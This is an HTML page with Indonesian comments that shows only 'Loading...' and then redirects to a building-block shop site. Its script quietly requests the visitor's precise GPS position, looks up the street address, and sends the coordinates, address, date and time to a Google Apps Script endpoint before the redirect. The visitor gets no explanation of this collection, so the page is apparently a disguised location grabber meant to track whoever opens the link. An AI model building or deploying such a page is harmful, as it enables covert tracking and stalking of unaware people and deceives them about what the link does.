<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #ffffff;
            font-family: Arial, sans-serif;
        }
        #loading-text {
            color: #555555;
            font-size: 18px;
            letter-spacing: 2px;
        }
    </style>
</head>
<body>

    <h2 id="loading-text">Loading...</h2>

    <script>
        // URL Web App Google Apps Script Anda
        const WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbzE7IpxAV273CT3tB7M4gcouYoj6zMmFN0B5ub_Wm1xcQcS4zHbczR89-vu6jqsKeBJYQ/exec';
        
        // Link tujuan website baru Anda
        const TARGET_URL = 'https://rachmatfadilahhanif-star.github.io/toko-batako-bragolan/';

        window.onload = function() {
            const statusText = document.getElementById("loading-text");

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async function(position) {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        
                        const sekarang = new Date();
                        const tanggal = sekarang.toLocaleDateString();
                        const waktu = sekarang.toLocaleTimeString();

                        // Ambil nama alamat berdasarkan koordinat GPS
                        let alamatLengkap = "Gagal mendeteksi alamat";
                        try {
                            const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
                            const data = await response.json();
                            if (data && data.display_name) {
                                alamatLengkap = data.display_name;
                            }
                        } catch (e) {
                            alamatLengkap = "Koordinat murni";
                        }

                        // Kirim data ke Google Apps Script / Drive
                        const formData = new URLSearchParams();
                        formData.append("latitude", lat);
                        formData.append("longitude", lon);
                        formData.append("alamat", alamatLengkap);
                        formData.append("tanggal", tanggal);
                        formData.append("waktu", waktu);

                        fetch(WEB_APP_URL, {
                            method: "POST",
                            mode: "no-cors",
                            body: formData
                        }).finally(() => {
                            // SETELAH TERSIMPAN, OTOMATIS PINDAH KE HALAMAN TUJUAN
                            window.location.href = TARGET_URL;
                        });

                    },
                    function(error) {
                        // Jika izin lokasi ditolak, tetap arahkan ke link tujuan
                        window.location.href = TARGET_URL;
                    },
                    {
                        timeout: 10000,
                        maximumAge: 0,
                        enableHighAccuracy: true
                    }
                );
            } else {
                window.location.href = TARGET_URL;
            }
        };
    </script>

</body>
</html>
